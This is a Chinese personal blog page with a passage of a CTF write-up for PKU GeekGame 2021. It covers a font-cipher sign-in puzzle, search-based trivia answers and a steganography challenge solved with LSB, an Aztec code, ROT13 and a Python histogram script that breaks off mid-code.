<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTF | 2021 PKU GeekGame 1st WriteUp, MiaoTony,blog">
    <meta name="description" content="第一届PKU GeekGame来了，题目的点套的太多了，太顶了，打得比较自闭。">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-159946730-1');
</script>


    <title>CTF | 2021 PKU GeekGame 1st WriteUp | MiaoTony&#39;s小窝</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/favicon.ico">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/matery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my.css">
	
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/jquery/jquery.min.js"></script>
    <script>
        //来个特效玩玩喵 20200123
        var titleTime;
        var OriginTitile = document.title;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '|ω·) 喵~快回来呀！';
                clearTimeout(titleTime);
            } else {
                document.title = '(/≧▽≦)/ Meow！';
                titleTime = setTimeout(function() {
        	    document.title = OriginTitile;
        }, 800);
    }
        });
    </script>
<meta name="generator" content="Hexo 5.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">MiaoTony&#39;s小窝</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">MiaoTony&#39;s小窝</div>
        <div class="logo-desc">
            
            喵~欢迎各位大佬的来访呀！
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/20.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTF | 2021 PKU GeekGame 1st WriteUp</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        min-width: 240px;
        padding-left: 15px;
        padding-bottom: 30px;
    }

    .toc-widget .toc-title {
        padding: 30px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
	    max-height: 450px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/WriteUp/">
                                <span class="chip bg-color">WriteUp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-11-25
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    15.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    75 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p><img src="/2021/11/25/CTF_2021PKUGeekGame/logo-color-1st.png"></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PKU GeekGame 来了。</p>
<blockquote>
<p><strong>北京大学信息安全综合能力竞赛</strong></p>
<p>在2021年5月曾举办了具有试水性质的“第零届”竞赛，因此本届竞赛命名为第一届。    本届竞赛将继续追求 <strong>题目新颖有趣、难度具有梯度，让没有相关经验的新生和具有一定专业基础的学生都能享受比赛，在学习的过程中有所收获。</strong></p>
<p> 竞赛的考察内容涉及到信息安全的各个方面，主要包括：</p>
<ul>
<li><p><strong>Misc: 基本技能</strong>（常见编码、信息检索利用能力等）</p>
</li>
<li><p><strong>Web: 网站安全</strong>（Web 漏洞利用、JavaScript 编程等）</p>
</li>
<li><p><strong>Binary: 二进制安全</strong>（逆向工程、程序调试等）</p>
</li>
<li><p><strong>Algorithm: 算法安全</strong>（现代密码学、算法设计等）</p>
<p>  每道题目的考察内容可能不唯一，以上分类仅供参考。</p>
</li>
</ul>
<p><strong>赛程安排</strong></p>
<p>比赛时间为北京时间 <strong>11 月 13 日（周六）12:00 到 20 日（周六）12:00</strong>，持续一周时间。    </p>
<p>竞赛为个人线上解题赛，选手需要解决与安全相关的谜题获得答案。    </p>
<p>本竞赛不专门设置报名环节，<strong>选手在比赛结束前可以自由登录本平台 geekgame.pku.edu.cn 参赛</strong>。</p>
<p>本届竞赛将分为两个阶段，时长分别为 5 天和 2 天。<strong>在第二阶段将放出提示或降低难度，同时在此阶段解出题目将只能获得 1/4 的分数</strong>。通过第二阶段，希望思路卡壳的选手能够借助提示不留遗憾，同时萌新也有机会挑战难题。</p>
<p><strong>比赛时间表：</strong> </p>
<ul>
<li><strong>13 日（周六）12:00</strong>：比赛开始，题目将在前两天内分批放出</li>
<li><strong>18 日（周四）12:00</strong>：比赛进入第二阶段，将放出提示或降低难度，在此阶段获得的分数将减少</li>
<li><strong>20 日（周六）12:00</strong>：比赛结束，将无法再提交答案，题目环境将继续开放</li>
<li><strong>21 日（周日）22:00 前</strong>：校内排名前 35 名的选手需要提交每道解出题目的解题报告（Writeup）</li>
<li><strong>比赛结束后</strong>：将举办颁奖典礼，并公开官方 Writeup 和部分优秀选手 Writeup</li>
</ul>
</blockquote>
<p><a href="https://miaotony.xyz/2021/11/03/CTF_2021Hackergame/">USTC Hackergame</a> 结束了，北大的第一届 GeekGame 来了。然而总共举办的次数并不是1而是2，因为是从0开始的（23333</p>
<p>想着 hackergame 没好好打，于是就来这个比赛看看题了呗。结果一打自闭好几天，麻了。</p>
<p>本来这篇 writeup 应该比赛结束就发的，但是还想着复现几个题于是就咕了，但是后来发现也没啥时间复现了，咕了好久想想还是直接发了吧（（（</p>
<h2 id="→签到←"><a href="#→签到←" class="headerlink" title="→签到←"></a>→签到←</h2><p><a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/media/prob01_lwzltdrojur150zq.zip?token=xxx">https://geekgame.pku.edu.cn/media/prob01_lwzltdrojur150zq.zip?token=xxx</a></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113130715720.png"></p>
<p>编辑文字，把里面内容复制出来，然后俩栅栏手工补一下。</p>
<pre class="line-numbers language-none"><code class="language-none">fa{aeAGetTm@ekaev!
lgHv__ra_ieGeGm_1}

flag{Have_A_Great_Time@GeekGame_v1!}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p><strong>花絮</strong></p>
<p>有天在实验室，有个学弟来看了看题目，本来想签个到的，发现怎么都整不出来，然后找到了 <a href="https://miaotony.xyz/2020/04/21/CTF_2020Ha1cyonCTF/#Classical-Cipher">喵喵之前写的一篇 wp</a>，找到了当时比对字体的网站，然后比对到了用的 Wingdings 字体，但是发现 pdf 不全，于是没签上到（摊手.jpg</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211123033010625.png"></p>
</blockquote>
<h2 id="小北问答-Remake"><a href="#小北问答-Remake" class="headerlink" title="小北问答 Remake"></a>小北问答 Remake</h2><blockquote>
<p>You 酱善于使用十种搜索引擎，别人不清楚的知识她能一秒钟搜索出来。这是众人皆知的事实。 </p>
<p>You 酱的朋友菜宝在刷往年题的时候找到了一份没有答案的资料。她本想询问 You 酱，但听说 You 酱已经早在 5 月份就把课程辅导这项业务外包给了你。 </p>
<p>于是，现在菜宝手持两枚 Flag，希望你能帮她解答这些题目。你每小时可以提交一次答案，答对至少一半可以获得第一个 Flag，全部答对可以获得第二个 Flag。</p>
</blockquote>
<h3 id="1"><a href="#1" class="headerlink" title="#1"></a>#1</h3><blockquote>
<p>北京大学燕园校区有理科 1 号楼到理科 X 号楼，但没有理科 (X+1) 号及之后的楼。X 是？                        </p>
</blockquote>
<p>答案格式：  <code>^\d+$</code> </p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113175250368.png"></p>
<p>5</p>
<h3 id="2"><a href="#2" class="headerlink" title="#2"></a>#2</h3><blockquote>
<p>上一届（第零届）比赛的总注册人数有多少？                        </p>
</blockquote>
<p>答案格式：<code>^\d+$</code> </p>
<blockquote>
<p>竞赛采取个人线上赛的形式，从5月16日至23日，在CTF赛制的基础上加入一定的基础知识竞赛等内容，共设17道信息安全综合能力竞赛题。本次大赛共有407人注册参赛，有效选手334人。历经七天的紧张比赛，大赛共决出一等奖三名、二等奖七名、三等奖二十名、新生特别奖三名、“一血奖”十七人次。</p>
<p>via <a target="_blank" rel="noopener" href="https://news.pku.edu.cn/xwzh/203d197d93c245a1aec23626bb43d464.htm">北京大学举办首届信息安全综合能力竞赛</a></p>
</blockquote>
<p>407</p>
<h3 id="3"><a href="#3" class="headerlink" title="#3"></a>#3</h3><blockquote>
<p>geekgame.pku.edu.cn 的 HTTPS 证书曾有一次忘记续期了，发生过期的时间是？                        </p>
</blockquote>
<p>答案格式： <code>^2021-\d\d-\d\dT\d\d:\d\d:\d3\+08:00$</code></p>
<p><a target="_blank" rel="noopener" href="https://crt.sh/?q=geekgame.pku.edu.cn">https://crt.sh/?q=geekgame.pku.edu.cn</a></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113174605640.png"></p>
<p><a target="_blank" rel="noopener" href="https://crt.sh/?id=4362003382">https://crt.sh/?id=4362003382</a></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113174908853.png"></p>
<p><code>2021-07-11T08:49:53+08:00</code></p>
<h3 id="4"><a href="#4" class="headerlink" title="#4"></a>#4</h3><blockquote>
<p>2020 年 DEFCON CTF 资格赛签到题的 flag 是？                        </p>
</blockquote>
<p>答案格式：<code>^.+{.+}$</code></p>
<p><a target="_blank" rel="noopener" href="https://archive.ooo/c/welcome-to-dc2020-quals/358/">https://archive.ooo/c/welcome-to-dc2020-quals/358/</a></p>
<p><a target="_blank" rel="noopener" href="https://s3.us-west-2.amazonaws.com/archive-ooo-public/public_files/7ea9b08d24b9ab179e901316db875cd3c08f27de29b8f8152ce298e26a2961be/welcome.txt">https://s3.us-west-2.amazonaws.com/archive-ooo-public/public_files/7ea9b08d24b9ab179e901316db875cd3c08f27de29b8f8152ce298e26a2961be/welcome.txt</a></p>
<p><code>OOO{this_is_the_welcome_flag}</code></p>
<h3 id="5"><a href="#5" class="headerlink" title="#5"></a>#5</h3><blockquote>
<p>在大小为 672328094 * 386900246 的方形棋盘上放 3 枚（相同的）皇后且它们互不攻击，有几种方法？                        </p>
</blockquote>
<p>答案格式： <code>^\d+$</code></p>
<p>这题硬是到了最后一天也没懂怎么做。。把三（n）皇后问题看了又看，怎么一堆 DFS 回溯啥的，喵喵好菜啊不懂算法，呜呜。（感觉是有必要学学算法了</p>
<p>而且，一直在想不是 n*n 这种正方形的情况该怎么解好啊……摸了。</p>
<p><em>（猜了 114514，1145141919810，发现都不是</em></p>
<p> BTW, 嘉然啊……</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211118013435082.png"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211118013500999.png"></p>
<blockquote>
<p>第二阶段提示</p>
<p>不同的领域有不同的专业工具。你可能无法一下找到答案，但是你能找到一个工具，然后用这个工具得到答案。<br>这个工具可能是某个信息公开系统，可能是某个资料存档，可能是某个在线查询服务。而对于整数数列构成的数学问题来说，这个著名的工具是……</p>
</blockquote>
<p>整数数列构成的数学问题，当时没想到，只是谷歌查了 三个皇后，没查到，gg。</p>
<p>赛后才知道原来说的是 <em>OEIS</em>，<a target="_blank" rel="noopener" href="https://oeis.org/Seis.html">The On-Line Encyclopedia of Integer Sequences® (OEIS®)</a></p>
<p>搜索 3 queens 就能找到这个 <a target="_blank" rel="noopener" href="https://oeis.org/A047659">A047659</a> Number of ways to place <strong>3</strong> nonattacking <strong>queens</strong> on an n X n board.</p>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">In general, for m &lt;= n, n &gt;= 3, the number of ways to place 3  nonattacking queens on an m X n board is n^3/6*(m^3 - 3*m^2 + 2*m) -  n^2/2*(3*m^3 - 9*m^2 + 6*m) + n/6*(2*m^4 + 20*m^3 - 77*m^2 + 58*m) -  1/24*(39*m^4 - 82*m^3 - 36*m^2 + 88*m) + 1/16*(2*m - 4*n + 1)*(1 +  (-1)^(m+1)) + 1/2*(1 + abs(n - 2*m + 3) - abs(n - 2*m + 4))*(1/24*((n -  2*m + 11)^4 - 42*(n - 2*m + 11)^3 + 656*(n - 2*m + 11)^2 - 4518*(n - 2*m + 11) + 11583) - 1/16*(4*m - 2*n - 1)*(1 + (-1)^(n+1))) [Panos  Louridas, idee &amp; form 93/2007, pp. 2936-2938]. - Vaclav Kotesovec, Feb 20 2016<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</blockquote>
<h3 id="6"><a href="#6" class="headerlink" title="#6"></a>#6</h3><blockquote>
<p>上一届（第零届）比赛的“小北问答1202”题目会把所有选手提交的答案存到 SQLite 数据库的一个表中，这个表名叫？                        </p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-0th/blob/main/src/choice/game/db.py">https://github.com/PKU-GeekGame/geekgame-0th/blob/main/src/choice/game/db.py</a></p>
<p><code>submits</code></p>
<h3 id="7"><a href="#7" class="headerlink" title="#7"></a>#7</h3><blockquote>
<p>国际互联网由许多个自治系统（AS）组成。北京大学有一个自己的自治系统，它的编号是？ </p>
</blockquote>
<p>答案格式： <code>^AS\d+$</code> </p>
<p><a target="_blank" rel="noopener" href="https://bgp.he.net/search?search%5Bsearch%5D=Peking+University&amp;commit=Search">https://bgp.he.net/search?search%5Bsearch%5D=Peking+University&amp;commit=Search</a></p>
<p>AS59201</p>
<h3 id="8"><a href="#8" class="headerlink" title="#8"></a>#8</h3><blockquote>
<p>截止到 2021 年 6 月 1 日，北京大学信息科学技术学院下属的中文名称最长的实验室叫？ </p>
</blockquote>
<p>答案格式： <code>^.{15,30}(实验室|中心)$</code> </p>
<p><a target="_blank" rel="noopener" href="https://eecs.pku.edu.cn/info/1060/11528.htm">信息科学技术学院2022年招生指南</a></p>
<p>区域光纤通信网与新型光通信系统国家重点实验室</p>
<p><code>flag{JiU-Cong-Xian-Zai-Kai-SHi}</code></p>
<h2 id="叶子的新歌"><a href="#叶子的新歌" class="headerlink" title="叶子的新歌"></a>叶子的新歌</h2><blockquote>
<p>“叶子又发新歌了。”</p>
<p>叶子是小雨的好朋友，最近想成为四轱辘爱抖露所以沉迷写歌，但由于资质太过平庸，他写的歌并没有什么人听。每当他在无人问津的阴雨霉湿之地，和着雨音，唱着没有听众的歌曲的时候，也不会有人因为他的歌声而在路上拦住他说：太好汀了⑧！</p>
<p>不过毕竟，叶子是小雨最好最好的朋友，小雨还是决定听一听叶子的新歌。但是她总感觉，叶子似乎在歌里藏了一些东西。</p>
<p>“是想对我说的话吗？”</p>
<p>小雨决定找出歌里藏着的三个Flag。</p>
</blockquote>
<h3 id="夢は時空を越えて"><a href="#夢は時空を越えて" class="headerlink" title="夢は時空を越えて"></a>夢は時空を越えて</h3><p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113125224856.png"></p>
<p><code>Secret in Album Cover!!</code></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/00000002.png"></p>
<p>lsb</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113130204246.png"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/1.png"></p>
<p>Aztec 条码</p>
<p><a target="_blank" rel="noopener" href="https://products.aspose.app/barcode/zh-hans/recognize/aztec#/recognized">https://products.aspose.app/barcode/zh-hans/recognize/aztec#/recognized</a></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113130223148.png"></p>
<pre class="line-numbers language-none"><code class="language-none">Gur frperg va uvfgbtenz.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ROT13</p>
<pre class="line-numbers language-none"><code class="language-none">The secret in histogram.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>草 直方图。。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113133127634.png"></p>
<p>然而太不清晰了……没办法怎么都扫不出来。<em>（赛后才知道其实是反色了）</em></p>
<p>最后不行还得上py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> cv2
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt

image <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">"1.png"</span><span class="token punctuation">)</span>
colors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> n<span class="token punctuation">,</span> color <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>colors<span class="token punctuation">)</span><span class="token punctuation">:</span>
    hist <span class="token operator">=</span> cv2<span class="token punctuation">.</span>calcHist<span class="token punctuation">(</span><span class="token punctuation">[</span>image<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>hist<span class="token punctuation">,</span> color<span class="token operator">=</span>color<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>hist<span class="token punctuation">)</span>
    plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>

hist2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'1'</span> <span class="token keyword">if</span> h<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">8196.0</span> <span class="token keyword">else</span> <span class="token string">'0'</span> <span class="token keyword">for</span> h <span class="token keyword">in</span> hist<span class="token punctuation">]</span>
hist3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'0'</span> <span class="token keyword">if</span> h<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">8196.0</span> <span class="token keyword">else</span> <span class="token string">'1'</span> <span class="token keyword">for</span> h <span class="token keyword">in</span> hist<span class="token punctuation">]</span>
d2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>hist2<span class="token punctuation">)</span>
d3 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>hist3<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d3<span class="token punctuation">)</span>
<span class="token comment"># 1110100011000001111100010001001111100111101001000001101110001011001111110011000110001111011100010010000011001111110110011000001000111010011110001100010011000011110010000110000110011111000100100010000100111000010001011100000111001100011100111000011110010110</span>

target <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGBA'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
